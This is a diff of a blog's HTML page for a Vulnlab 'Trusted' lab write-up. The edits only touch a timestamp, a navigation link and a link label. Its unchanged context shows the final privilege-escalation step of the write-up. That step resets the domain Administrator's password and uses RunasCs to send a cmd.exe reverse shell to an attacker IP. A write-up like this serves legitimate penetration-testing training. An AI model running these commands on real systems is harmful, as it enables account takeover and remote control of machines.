@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://panosoikogr.github.io/images/Trusted/krbtgthash.png">
 <meta property="og:image" content="https://panosoikogr.github.io/images/Trusted/trusted_admin.png">
 <meta property="article:published_time" content="2025-04-13T16:31:47.000Z">
-<meta property="article:modified_time" content="2025-04-13T13:35:14.416Z">
+<meta property="article:modified_time" content="2025-04-13T13:35:55.884Z">
 <meta property="article:author" content="Panosoiko">
 <meta property="article:tag" content="VL">
 <meta property="article:tag" content="Chain">
@@ -112,6 +112,8 @@
     <br/>
     <span id="actions">
       <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/04/15/VL-Heron/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="Next post" href="/2025/04/11/VL-Sweep/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -268,7 +270,7 @@
 <h2 id="Final-Privilege-Escalation"><a href="#Final-Privilege-Escalation" class="headerlink" title="Final Privilege Escalation"></a>Final Privilege Escalation</h2><p>Since we couldn’t directly access the <code>root.txt</code> file without administrator context, we changed the Administrator password and used RunasCs to get a shell with administrative privileges:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user Administrator HelloWorld123@</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./RunasCs.exe Administrator &#x27;HelloWorld123@&#x27; cmd.exe -r &#x27;10.8.5.195:443&#x27;</span><br></pre></td></tr></table></figure>
-<p>This provided us with full administrative access to the domain, completing the penetration test.<br><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=009839ab-3a10-4656-8b08-522ca143c36b">Vulnlab Exercise Link</a></p>
+<p>This provided us with full administrative access to the domain, completing the penetration test.<br><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=009839ab-3a10-4656-8b08-522ca143c36b">Vulnlab Cert</a></p>
 
   </div>
 </article>
